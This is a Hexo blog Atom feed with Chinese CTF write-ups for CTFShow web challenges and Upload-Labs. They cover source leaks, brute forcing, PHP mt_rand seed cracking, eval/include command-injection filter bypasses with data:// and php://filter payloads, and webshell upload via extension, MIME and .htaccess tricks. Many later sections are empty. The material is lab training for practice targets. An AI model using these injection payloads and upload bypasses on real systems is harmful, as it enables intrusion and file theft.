<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2022-09-28T19:06:29.769Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CTFShow</title>
    <link href="http://example.com/post/CTFShow.html"/>
    <id>http://example.com/post/CTFShow.html</id>
    <published>2022-09-28T18:49:51.000Z</published>
    <updated>2022-09-28T19:06:29.769Z</updated>
    
    <content type="html"><![CDATA[<p>CTFShow</p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><p>开发注释未及时删除 </p><p>直接查看源码，flag在注释里</p><h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>js前台拦截 === 无效操作</p><p>浏览器禁用js或则Burp抓包</p><h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p>f12 网络在响应头里就有flag或者直接抓包</p><h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><p>robots.txt文件泄露</p><p>直接查看robots.txt</p><p>robots.txt （统一小写）是一种存放于网站根目录下的ASCII编码的文本文件。</p><p>常见的备份文件</p><pre><code>.index.php.swpindex.php.swpindex.php.bak.index.php~index.php.bak_Edietplusindex.php.~index.php.1index.phpindex.php~index.php.rarindex.php.zipindex.php.7zindex.php.tar.gzwww.zipwww.rarwww.zipwww.7zwww.tar.gzwww.tarweb.zipweb.rarweb.zipweb.7zweb.tar.gzweb.tarwwwroot.rarweb.rar</code></pre><h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><p>phps文件泄露</p><p>phps存放着php源码，可通过尝试访问/index.phps读取,或者尝试扫描工具扫描读取</p><pre><code>php备份文件：后缀为php~或者index.php.bakphp的源代码文件：后缀为phps</code></pre><h2 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h2><p>源码压缩包泄露</p><p>直接访问<a href="http://www.zip,压缩包发现fl000g.txt,url+fl000g.txt访问/">www.zip，压缩包发现fl000g.txt，url+fl000g.txt访问</a></p><h2 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h2><p>版本控制泄露源码</p><pre><code>git / svn</code></pre><p>是由于运行git init初始化代码库的时候，会在当前目录下面产生一个.git的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候， .git 这个目录没有删除，直接发布了。使用这个文件，可以用来恢复源代码。</p><p>访问 url/.git/ ，得到 flag 。</p><p>.git文件泄露，当开发人员使用git控制版本时，如果操作不当，可能导致git流入线上环境，导致.git文件夹下的文件被访问，代码泄露，如.git/index文件可找到工程所有文件名和sha1文件,在git/objects下载导致危害</p><p>类似的还有 .hg 源码泄露，由于 hg init 的时候生成 .hg 文件。</p><h2 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h2><p>.svn泄露，svn是源代码管理系统，在管理代码的过程中，会生成一个.svn的隐藏文件，导致源码泄露（造成原因是在发布代码时没有使用导入功能，而是直接粘贴复制）</p><p>访问 url/.svn/ ，得到 flag 。</p><p>Subversion，简称SVN，是一个开放源代码的版本控制系统，相对于的RCS、CVS，采用了分支管理系统，它的设计目标就是取代CVS。互联网上越来越多的控制服务从CVS转移到Subversion。Subversion使用服务端—客户端的结构，当然服务端与客户端可以都运行在同一台服务器上。在服务端是存放着所有受控制数据的Subversion仓库，另一端是Subversion的客户端程序，管理着受控数据的一部分在本地的映射（称为“工作副本”）。在这两端之间，是通过各种仓库存取层（Repository Access，简称RA）的多条通道进行访问的。这些通道中，可以通过不同的网络协议，例如HTTP、SSH等，或本地文件的方式来对仓库进行操作。</p><h2 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h2><p>vim临时文件泄露</p><p>如果vim编写时 不是正常退出 就会临时留下一个 后缀名为swp的文件 我们可以查看该文件<br>同时多次意外退出并<strong>不会覆盖旧的.swp文件</strong>，而是会生成一个新的，例如**.swo**文件。</p><p>vim缓存泄露，在使用vim进行编辑时，会产生缓存文件，操作正常，则会删除缓存文件，如果意外退出，缓存文件保留下来，这是时可以通过缓存文件来得到原文件，以index.php来说，第一次退出后，缓存文件名为 .index.php.swp，第二次退出后，缓存文件名为.index.php.swo,第三次退出后文件名为.index.php.swn</p><p>直接访问index.php.swp</p><pre><code>一、vim备份文件     默认情况下使用Vim编程，在修改文件后系统会自动生成一个带~的备份文件，某些情况下可以对其下载进行查看；    eg:index.php普遍意义上的首页，输入域名不一定会显示。   它的备份文件则为index.php~二、vim临时文件    vim中的swp即swap文件，在编辑文件时产生，它是隐藏文件，如果原文件名是submit，则它的临时文件 .submit.swp。如果文件正常退出，则此文件自动删除。</code></pre><h2 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h2><p>cookie泄露，直接 F12 或 burp 抓包看cookie获取flag 。</p><h2 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h2><p>域名txt记录泄露</p><p>域名其实也可以隐藏信息，在线DNS域名解析，即可得到flag</p><pre><code>https://whois.chinaz.com/http://www.jsons.cn/nslookup/https://zijian.aliyun.com/</code></pre><h2 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h2><p>敏感信息公布</p><p>url/admin/访问后台需要登陆</p><p>猜测用户名为admin，密码为页面最下方联系电话号码，登录成功</p><h2 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h2><p>内部技术文档泄露</p><p>在页面最下方找到了document，点击进入发现是内部文档，通过后台地址以及用户名和密码登录获取flag</p><h2 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h2><p>编辑器配置不当</p><p>进入url/editor/</p><p>插入文件-&gt;文件空间</p><p>随便点点看看有没有可疑文件，最后发现tmp/html/nothinghere/fl000g.txt</p><p>直接访问url+/nothinghere/fl000g.txt进入得到flag</p><h2 id="web15"><a href="#web15" class="headerlink" title="web15"></a>web15</h2><p>密码逻辑脆弱</p><p>进入url/admin/，需要用户名和密码登录，点击找回密码，需要填写所在地，在页面最下方有一个qq邮箱，通过qq号查询发现在西安，填写密保问题重置密码，登录成功获取flag</p><h2 id="web16"><a href="#web16" class="headerlink" title="web16"></a>web16</h2><p>探针泄露</p><pre><code>考察PHP探针php探针是用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看服务器硬盘资源、内存占用、网卡 流量、系统负载、服务器时间等信息。 url后缀名添加/tz.php 版本是雅黑PHP探针，然后查看phpinfo搜索flag</code></pre><p>访问/tz.php</p><p>再点击进入phpinfo可以得到flag</p><h2 id="web17"><a href="#web17" class="headerlink" title="web17"></a>web17</h2><p>备份SQL文件泄露</p><p>backup.sql</p><h2 id="web18"><a href="#web18" class="headerlink" title="web18"></a>web18</h2><p>js敏感信息泄露</p><p>直接查看js代码，在分数大于100时，windows.confirm(一串uniciode编码)，将其转换为中文，得到110.php，获得flag</p><h2 id="web19"><a href="#web19" class="headerlink" title="web19"></a>web19</h2><p>前端密钥泄露</p><p>直接查看前端代码，在注释发现用户名和密码，直接登录失败，使用Burp发包，获得flag</p><h2 id="web20"><a href="#web20" class="headerlink" title="web20"></a>web20</h2><p>mdb文件是早期asp+access构架的数据库文件 直接查看url路径添加/db/db.mdb 下载文件通过txt打开或者通过EasyAccess.exe打开搜索flag flag{ctfshow_old_database}</p><h2 id="web21"><a href="#web21" class="headerlink" title="web21"></a>web21</h2><p>CDN穿透</p><p>确定 IP 的话，直接 <strong>ping 域名</strong>，得到 IP</p><p><img src="https://raw.githubusercontent.com/Yum1Yum1/images/master/blogImg/image-20220927230417655.png" alt="image-20220927230417655"></p><h1 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h1><h2 id="web21-1"><a href="#web21-1" class="headerlink" title="web21"></a>web21</h2><p><a href="https://www.cnblogs.com/007NBqaq/p/13220297.html">tomcat 认证爆破之custom iterator使用 - 007NBqaq - 博客园 (cnblogs.com)</a></p><p>抓包发现，随便输入的密码被base64编码，解码username:password</p><p>对密码进行爆破，猜测用户名为admin:</p><p><img src="https://raw.githubusercontent.com/Yum1Yum1/images/master/blogImg/image-20220927234912376.png" alt="image-20220927234912376"></p><p>爆破时要进行base64加密以及关掉默认的url编码</p><p><img src="https://raw.githubusercontent.com/Yum1Yum1/images/master/blogImg/image-20220927235837340.png" alt="image-20220927235837340"></p><p>最后密码为shark63，获取flag</p><h2 id="web22"><a href="#web22" class="headerlink" title="web22"></a>web22</h2><p>子域名爆破</p><p>使用域名挖掘机</p><h2 id="web23"><a href="#web23" class="headerlink" title="web23"></a>web23</h2><pre><code>substr(string,start,length)</code></pre><p><img src="https://raw.githubusercontent.com/Yum1Yum1/images/master/blogImg/image-20220928203659084.png" alt="image-20220928203659084"></p><p>打开就是一段代码，手动写一段脚本爆破</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html lang='en'&gt;&lt;head&gt;    &lt;meta charset="UTF-8"&gt;    &lt;meta http-equiv="X-UA-Compatible" content="IE=edge"&gt;    &lt;meta name="viewport" content="width=device-width,initial-scale=1.0"&gt;    &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;?php        for ($i = 0; $i &lt; 1000; $i = $i + 1) {        $token = md5($i);        if (substr($token, 1, 1) === substr($token, 14, 1) &amp;&amp; substr($token, 14, 1) === substr($token, 17, 1)) {            if ((intval(substr($token, 1, 1)) + intval(substr($token, 14, 1)) + substr($token, 17, 1)) / substr($token, 1, 1) === intval(substr($token, 31, 1))) {                echo $i;            }        }    }    ?&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h2 id="web24"><a href="#web24" class="headerlink" title="web24"></a>web24</h2><p>mt_srand伪随机数</p><p>mt_srand函数只要规定了种子，其得到的伪随机数就是确定的，因此，我们自行构造一个和其种子一样的代码</p><p>mt_scrand(seed)这个函数的意思，是通过分发seed种子，然后种子有了后，靠mt_rand()生成随机 数。 提示：从 PHP 4.2.0 开始，随机数生成器自动播种，因此没有必要使用该函数 因此不需要播种，并且如果设置了 seed参数 生成的随机数就是伪随机数，意思就是每次生成的随机数 是一样的</p><p><img src="https://raw.githubusercontent.com/Yum1Yum1/images/master/blogImg/image-20220928204151045.png" alt="image-20220928204151045"></p><pre><code>&lt;?php        mt_srand(372619038);            echo intval(mt_rand());?&gt;</code></pre><h2 id="web25"><a href="#web25" class="headerlink" title="web25"></a>web25</h2><p>mtrand()随机数生成漏洞</p><pre><code>include("flag.php");if(isset($_GET['r'])){    $r = $_GET['r'];    mt_srand(hexdec(substr(md5($flag), 0,8)));    $rand = intval($r)-intval(mt_rand());//当r取0的时候就可以得到mt_rand()的值    if((!$rand)){        if($_COOKIE['token']==(mt_rand()+mt_rand())){            echo $flag;        }    }else{        echo $rand;    }}else{    highlight_file(__FILE__);    echo system('cat /proc/version');}</code></pre><p><img src="https://raw.githubusercontent.com/Yum1Yum1/images/master/blogImg/image-20220928213416452.png" alt="image-20220928213416452"></p><p>使用<a href="https://www.openwall.com/php_mt_seed/">php_mt_seed - MT_RAND（）种子饼干 (openwall.com)</a>爆破出种子</p><p><img src="https://raw.githubusercontent.com/Yum1Yum1/images/master/blogImg/image-20220928213505637.png" alt="image-20220928213505637"></p><p>最后可以得到，这三个mt_rand()的值都不一样</p><pre><code>&lt;?php        mt_srand(2414568491);            echo mt_rand()."\n";        echo mt_rand()+mt_rand();  ?&gt;</code></pre><p>然后通过burp发包获取flag</p><p><img src="https://raw.githubusercontent.com/Yum1Yum1/images/master/blogImg/image-20220928213555669.png" alt="image-20220928213555669"></p><h2 id="web26"><a href="#web26" class="headerlink" title="web26"></a>web26</h2><p>抓包后直接发包得到flag</p><p><img src="https://raw.githubusercontent.com/Yum1Yum1/images/master/blogImg/image-20220928214037577.png" alt="image-20220928214037577"></p><h2 id="web27"><a href="#web27" class="headerlink" title="web27"></a>web27</h2><p>爆破生日日期</p><p>可以获取录取名单，得到姓名和缺少出生日期的身份证号码</p><p><img src="https://raw.githubusercontent.com/Yum1Yum1/images/master/blogImg/image-20220928215007830.png" alt="image-20220928215007830"></p><p>在查询页面发包</p><p><img src="https://raw.githubusercontent.com/Yum1Yum1/images/master/blogImg/image-20220928215202881.png" alt="image-20220928215202881"></p><p>抓取后进行爆破</p><p><img src="https://raw.githubusercontent.com/Yum1Yum1/images/master/blogImg/image-20220928215240537.png" alt="image-20220928215240537"></p><p><img src="https://raw.githubusercontent.com/Yum1Yum1/images/master/blogImg/image-20220928215615461.png" alt="image-20220928215615461"></p><p>最后得到正确的日期</p><p><img src="https://raw.githubusercontent.com/Yum1Yum1/images/master/blogImg/image-20220928215722154.png" alt="image-20220928215722154"></p><p>登录获取flag</p><h2 id="web28"><a href="#web28" class="headerlink" title="web28"></a>web28</h2><p>提示爆破目录</p><p>通过暴力破解目录/0-100/0-100/看返回数据包</p><p>爆破的时候去掉2.txt 仅仅爆破目录即可</p><p><img src="https://raw.githubusercontent.com/Yum1Yum1/images/master/blogImg/image-20220928220633875.png" alt="image-20220928220633875"></p><p><img src="https://raw.githubusercontent.com/Yum1Yum1/images/master/blogImg/image-20220928220626441.png" alt="image-20220928220626441"></p><p><img src="https://raw.githubusercontent.com/Yum1Yum1/images/master/blogImg/image-20220928225002149.png" alt="image-20220928225002149"></p><h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><h2 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h2><pre><code>preg_match 执行一个正则表达式匹配</code></pre><pre><code>&lt;?php//模式分隔符后的"i"标记这是一个大小写不敏感的搜索if (preg_match("/php/i", "PHP is the web scripting language of choice.")) {    echo "查找到匹配的字符串 php。";} else {    echo "未发现匹配的字符串 php。";}?&gt;</code></pre><pre><code>error_reporting(0);if(isset($_GET['c'])){    $c = $_GET['c'];    if(!preg_match("/flag/i", $c)){        eval($c);    }    }else{    highlight_file(__FILE__);}</code></pre><pre><code>首先执行ls命令，利用system?c=system(ls);得到两个文件 flag.php和index.php用cat命令读取flag.php，因为过滤了flag所以使用通配符?c=system('cat fla*.php');?c=system("nl fla?????");?c=echo `nl fl''ag.php`;或者c=echo `nl fl“”ag.php`;?c=echo `nl fl\ag.php`;//转义字符绕过?c=include($_GET[1]);&amp;1=php://filter/read=convert.base64-encode/resource=flag.php?c=eval($_GET[1]);&amp;1=system('nl flag.php');?c=awk '{printf $0}' flag.php||?c=$a="fla";$b="g.php";echo%20file_get_contents($a.$b);</code></pre><pre><code>linux文件内容查看命令cat、tac、nl、more、less、head、tail、``</code></pre><pre><code>通配符*可以通配多个字符?可以通配一个字符</code></pre><h2 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h2><p>过滤了flag、system、php</p><pre><code>error_reporting(0);if(isset($_GET['c'])){    $c = $_GET['c'];    if(!preg_match("/flag|system|php/i", $c)){        eval($c);    }    }else{    highlight_file(__FILE__);}</code></pre><p>可以使用其他函数</p><pre><code>system()passthru()exec()shell_exec()popen()proc_open()pcntl_exec()反引号 同shell_exec()</code></pre><pre><code>c=echo exec('nl fla?????');c=echo `nl fla''g.p''hp`;c=echo `nl fla?????`;</code></pre><h2 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h2><pre><code>error_reporting(0);if(isset($_GET['c'])){    $c = $_GET['c'];    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'/i", $c)){        eval($c);    }    }else{    highlight_file(__FILE__);}</code></pre><pre><code>c=eval($_GET[1]);&amp;1=system('nl flag.php');//只过滤了c，1可以继续使用空格c=highlight_file(next(array_reverse(scandir(dirname(__FILE__)))));c=show_source(next(array_reverse(scandir(pos(localeconv())))));c=echo(`nl%09fl[abc]*`);//%09就是tab,[abc]也是正则的一种c="\x73\x79\x73\x74\x65\x6d"("nl%09fl[a]*");等价于system()c=echo`strings%09f*`;c=echo`strings\$IFS\$9f*`必须加转义字符</code></pre><pre><code>show_source(next(array_reverse(scandir(pos(localeconv())))));scandir('.')这个函数的作用是扫描当前目录localeconv()函数返回一包含本地数字及货币格式信息的数组。而数组第一项就是.pos()/current()函数返回数组第一个值array_reverse()是将数组颠倒next()将数组指针一项下一位show_source()的意思是读取函数内容</code></pre><h2 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h2><pre><code>if(isset($_GET['c'])){    $c = $_GET['c'];    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(/i", $c)){        eval($c);    }    }else{    highlight_file(__FILE__);}</code></pre><pre><code>c=$nice=include$_GET["url"]?&gt;&amp;url=php://filter/read=convert.base64-encode/resource=flag.php//include可以不用括号，后面直接跟变量不用空格，分号可以用?&gt;代替//利用filter协议读文件，将flag.php通过base64编码后进行输出。这样做的好处就是如果不进行编码，文件包含后就不会有输出结果，而是当做php文件执行了，而通过编码后则可以读取文件源码。使用的convert.base64-encode，就是一种过滤器。</code></pre><pre><code>data伪协议把一些体量比较小的数据直接嵌入在页面里，而不使用外部链接。data:text/plain是嵌入文本c=include$_GET[1]?&gt;&amp;1=data://text/plain,&lt;?php system("cat flag.php");?&gt;c=include$_GET[1]?&gt;&amp;1=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==</code></pre><h2 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h2><pre><code>if(isset($_GET['c'])){    $c = $_GET['c'];    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\"/i", $c)){        eval($c);    }    }else{    highlight_file(__FILE__);}</code></pre><pre><code>c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.phpc=include$_GET[1]?&gt;&amp;1=data://text/plain,&lt;?php system("cat flag.php");?&gt;</code></pre><h2 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h2><pre><code>if(isset($_GET['c'])){    $c = $_GET['c'];    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"/i", $c)){        eval($c);    }    }else{    highlight_file(__FILE__);}</code></pre><h2 id="web35"><a href="#web35" class="headerlink" title="web35"></a>web35</h2><p>同上</p><h2 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h2><pre><code>if(isset($_GET['c'])){    $c = $_GET['c'];    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"|\&lt;|\=|\/|[0-9]/i", $c)){        eval($c);    }    }else{    highlight_file(__FILE__);}</code></pre><pre><code>c=include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.phpc=include$_GET[a]?&gt;&amp;a=data://text/plain,&lt;?php system("cat flag.php");?&gt;</code></pre><h2 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h2><pre><code>if(isset($_GET['c'])){    $c = $_GET['c'];    if(!preg_match("/flag/i", $c)){        include($c);        echo $flag;        }        }else{    highlight_file(__FILE__);}</code></pre><pre><code>/?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg== //&lt;?php system('cat flag.php');?&gt;/?c=data://text/plain,&lt;?php system('cat fla*');?&gt;还可以配合UA头执行日志包含c=/var/log/nginx/access.log</code></pre><h2 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h2><pre><code>if(isset($_GET['c'])){    $c = $_GET['c'];    if(!preg_match("/flag|php|file/i", $c)){        include($c);        echo $flag;        }        }else{    highlight_file(__FILE__);}</code></pre><pre><code>/?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==也可以日志包含c=/var/log/nginx/access.log</code></pre><h2 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h2><p>data://text/plain, 这样就相当于执行了php语句 .php 因为前面的php语句已经闭合了，所以后面的.php会被当成html页面直接显示在页面上，起不到什么作用</p><pre><code>if(isset($_GET['c'])){    $c = $_GET['c'];    if(!preg_match("/flag/i", $c)){        include($c.".php");    }        }else{    highlight_file(__FILE__);}</code></pre><pre><code>/?c=data://text/plain,&lt;?php system('cat fla*');?&gt;??为什么base64不行</code></pre><h2 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h2><pre><code>if(isset($_GET['c'])){    $c = $_GET['c'];    if(!preg_match("/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\{|\[|\]|\}|\:|\'|\"|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i", $c)){        eval($c);    }        }else{    highlight_file(__FILE__);}</code></pre><pre><code></code></pre><h2 id="web41"><a href="#web41" class="headerlink" title="web41"></a>web41</h2><h2 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h2><h2 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h2><h2 id="web44"><a href="#web44" class="headerlink" title="web44"></a>web44</h2><h2 id="web45"><a href="#web45" class="headerlink" title="web45"></a>web45</h2><h2 id="web46"><a href="#web46" class="headerlink" title="web46"></a>web46</h2><h2 id="web47"><a href="#web47" class="headerlink" title="web47"></a>web47</h2><h2 id="web48"><a href="#web48" class="headerlink" title="web48"></a>web48</h2><h2 id="web49"><a href="#web49" class="headerlink" title="web49"></a>web49</h2><h2 id="web50"><a href="#web50" class="headerlink" title="web50"></a>web50</h2><h2 id="web51"><a href="#web51" class="headerlink" title="web51"></a>web51</h2><h2 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h2><h2 id="web53"><a href="#web53" class="headerlink" title="web53"></a>web53</h2><h2 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h2><h2 id="web55"><a href="#web55" class="headerlink" title="web55"></a>web55</h2><h2 id="web56"><a href="#web56" class="headerlink" title="web56"></a>web56</h2><h2 id="web57"><a href="#web57" class="headerlink" title="web57"></a>web57</h2><h2 id="web58"><a href="#web58" class="headerlink" title="web58"></a>web58</h2><h2 id="web59"><a href="#web59" class="headerlink" title="web59"></a>web59</h2><h2 id="web60"><a href="#web60" class="headerlink" title="web60"></a>web60</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;CTFShow&lt;/p&gt;
&lt;h1 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h1&gt;&lt;h2 id=&quot;web1&quot;&gt;&lt;a href=&quot;#web1&quot; class=&quot;headerlink&quot; t</summary>
      
    
    
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Upload-Labs</title>
    <link href="http://example.com/post/Upload-Labs.html"/>
    <id>http://example.com/post/Upload-Labs.html</id>
    <published>2022-09-28T18:49:40.000Z</published>
    <updated>2022-09-28T19:08:02.868Z</updated>
    
    <content type="html"><![CDATA[<p>Upload-Labs</p><h1 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h1><h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><p>使用一句话木马，直接进行上传，发现php后缀被限制，修改为jpg后缀重新上传，上传成功。</p><p><img src="D:\BLOGER\Hexo\source_posts\Upload-Labs.assets\image-20220919202851813.png" alt="image-20220919202851813"></p><p><img src="https://raw.githubusercontent.com/Yum1Yum1/images/master/blogImg/image-20220919203201183.png" alt="image-20220919203201183"></p><p>使用Burpsuite抓包</p><p><img src="https://raw.githubusercontent.com/Yum1Yum1/images/master/blogImg/image-20220919203351954.png" alt="image-20220919203351954"></p><p>将jpg后缀修改为php，发包</p><p><img src="https://raw.githubusercontent.com/Yum1Yum1/images/master/blogImg/image-20220919203501268.png" alt="image-20220919203501268"></p><p>就可以将php为后缀的文件上传到网站，使用蚁剑，复制图片地址</p><p><img src="https://raw.githubusercontent.com/Yum1Yum1/images/master/blogImg/image-20220919203610497.png" alt="image-20220919203610497"></p><h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><p>直接查看源码，发现就是js有一个checkFile()，将浏览器关闭js</p><p><img src="https://raw.githubusercontent.com/Yum1Yum1/images/master/blogImg/image-20220919203749483.png" alt="image-20220919203749483"></p><p><img src="https://raw.githubusercontent.com/Yum1Yum1/images/master/blogImg/image-20220919203901311.png" alt="image-20220919203901311"></p><p>修改后就可以直接上传php文件，重复上述步骤</p><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><p><img src="https://raw.githubusercontent.com/Yum1Yum1/images/master/blogImg/image-20220919204131654.png" alt="image-20220919204131654"></p><p>就是对文件后缀做限制</p><h1 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h1><ol><li>服务器MIME检测：即检测Content-Type的内容。</li><li>绕过方法：修改类型为允许上传的类型即可。</li></ol><p>直接上传php文件，文件类型不正确，使用burpsuite抓包</p><p><img src="https://raw.githubusercontent.com/Yum1Yum1/images/master/blogImg/image-20220919204235962.png" alt="image-20220919204235962"></p><p><img src="https://raw.githubusercontent.com/Yum1Yum1/images/master/blogImg/image-20220919210843412.png" alt="image-20220919210843412"></p><p>修改Content-Type为image/jpeg<code>、</code>image/png<code>、</code>image/gif</p><p><img src="https://raw.githubusercontent.com/Yum1Yum1/images/master/blogImg/image-20220919210955432.png" alt="image-20220919210955432"></p><p>上传成功</p><h2 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a>源码</h2><p>就是对文件类型进行判断</p><p><img src="https://raw.githubusercontent.com/Yum1Yum1/images/master/blogImg/image-20220919211135366.png" alt="image-20220919211135366"></p><h1 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h1><p>上传php文件</p><p><img src="https://raw.githubusercontent.com/Yum1Yum1/images/master/blogImg/image-20220919211233793.png" alt="image-20220919211233793"></p><p>基于黑名单检测：黑名单的安全性比白名单的安全性低很多，攻击手法自然也比白名单多。一般由个专门blacklist，里面包含常见的危险脚本文件。</p><p>绕过办法：</p><ol><li><p>文件大小写让绕过（Php ，PhP pHp，等）</p></li><li><p>黑白名单绕过（php，php2，php3，php5，phtml，asp，aspx，ascx，ashx，cer，asa，jsp，jspx）cdx，\x00hh\x46php</p><ol><li>基于白名单验证：只针对白名单中有的后缀名，文件才能上传成功。</li><li>基于黑名单验证：只针对黑名单中没有的后缀名，文件才能上传成功。</li><li>用黑名单不允许上传<code>.asp,.aspx,.php,.jsp</code>后缀的文件，但可以上传<code>.phtml、 .php3 .php5、php4、 .pht、php1、php2、phps</code>【这些后缀会被当成php文件解析】等等。</li></ol></li><li><p>特殊文件名绕过</p><ol><li>修改数据包里的文件名为 test.php 或 test.asp_(下划线是空格)由于这种命名格式在   windows系统里是不允许的，所以在绕过上传之后windows系统会自动去掉.点和空格。Linux和Unix中没有这个特性。</li><li>::$DATA(php在windows的时候如果文件名+”::DATA”会把::DATA之后的数据当作文件流处理，不会检测后缀名，且保持”::DATA”之前的文件名，其目的就是不检查后缀名)</li></ol></li><li><p>. .htaccess文件攻击（结合黑名单攻击）</p></li><li><p>解析绕过</p></li></ol><p><img src="https://raw.githubusercontent.com/Yum1Yum1/images/master/blogImg/image-20220919234219822.png" alt="image-20220919234219822"></p><p>使用双写绕过，因为会过滤::$DATA</p><h2 id="源码-2"><a href="#源码-2" class="headerlink" title="源码"></a>源码</h2><p><img src="https://raw.githubusercontent.com/Yum1Yum1/images/master/blogImg/image-20220919234453097.png" alt="image-20220919234453097"></p><h1 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h1><pre><code>.htaccess是什么：全称是Hypertext Access(超文本入口) .htaccess文件也被成为分布式配置文件，提供了针对目录改变配置的方法，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。.htaccess功能：文件夹密码保护、用户自定义重定向、自定义404页面、扩展名伪静态化、禁止特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表很可惜，这么一个强大的功能默认是不开启的 Apache （有伪静态的都可以试试）用法：AddType application/x-httpd-php .jpg 这个指令代表着.jpg文件会当做php来解析SetHandler application/x-httpd-php，意思是把所有文件都解析为php文件来执行。</code></pre><h1 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h1><p>Pass-06</p><p>Pass-07</p><p>Pass-08</p><p>Pass-09</p><p>Pass-10</p><p>Pass-11</p><p>Pass-12</p><p>Pass-13</p><p>Pass-14</p><p>Pass-15</p><p>Pass-16</p><p>Pass-17</p><p>Pass-18</p><p>Pass-20</p><p>Pass-21</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Upload-Labs&lt;/p&gt;
&lt;h1 id=&quot;Pass-01&quot;&gt;&lt;a href=&quot;#Pass-01&quot; class=&quot;headerlink&quot; title=&quot;Pass-01&quot;&gt;&lt;/a&gt;Pass-01&lt;/h1&gt;&lt;h2 id=&quot;1&quot;&gt;&lt;a href=&quot;#1&quot; class=&quot;hea</summary>
      
    
    
    
    
    <category term="文件上传" scheme="http://example.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>SQLI-LABS</title>
    <link href="http://example.com/post/SQLI-LABS.html"/>
    <id>http://example.com/post/SQLI-LABS.html</id>
    <published>2022-09-28T18:49:24.000Z</published>
    <updated>2022-09-28T19:07:02.814Z</updated>
    
